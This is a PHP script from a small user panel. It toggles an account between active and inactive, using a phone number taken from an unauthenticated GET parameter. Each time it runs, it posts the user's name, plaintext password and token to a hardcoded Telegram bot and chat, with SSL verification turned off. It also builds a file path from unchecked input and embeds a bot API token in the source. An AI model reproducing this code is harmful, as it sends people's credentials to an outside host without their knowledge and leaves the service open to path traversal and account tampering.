	<?php
$number=$_GET['number'];
$loc="userdata/$number/$number.txt";
if(file_exists($loc)){
	
	$s=file_get_contents($loc);
	$json=json_decode($s,true);
	$name=$json['name'];
	$password=$json['password'];
	$token=$json['token'];
	$status=$json['status'];
	
	if($status=='active'){
	  
	  $dg='{"name":"'.$name.'","number":"'.$number.'","password":"'.$password.'","token":"'.$token.'","gateway_added":"false","bot_added":"false","status":"inactive"}';
	  
	  $acr="inactivated";
	  $status1="INACTIVE";
	}
	if($status=='inactive'){
	  $dg='{"name":"'.$name.'","number":"'.$number.'","password":"'.$password.'","token":"'.$token.'","gateway_added":"false","bot_added":"false","status":"active"}';
	  $acr="activated";
	  $status1="ACTIVE";
	}
	
	$arc1=strtoupper($acr);
	
		$msgt='🚫USER '.$arc1.'🚫

✅NAME ==>  `'.$name.'`
	
✅NUMBER ==>  `'.$number.'`

✅PASSWORD ==> `'.$password.'`

✅STATUS ==>  *'.$status1.'*

✅TOKEN ==> `'.$token.'` 

✅PANEL BY ==> *@I_AMANKIT*
' ;
	$tes=urlencode($msgt);
$url99='https://api.telegram.org/bot5224131825:AAG9QBqngjlXc-LtJgz3GfyfRx_GRJCsZ54/sendMessage?chat_id=1005500354&text='.$tes.'&parse_mode=markdown';
	
	$headers[]='user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36';
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url99);
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_HTTPHEADER,$headers);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
$output=curl_exec($ch);
file_put_contents("userdata/$number/$number.txt",''.$dg.'');
	echo'{"status":"true","message":"user '.$acr.'"}';
}else{echo'{"status":"false","message":"user not rejestered"}';}
	
	?>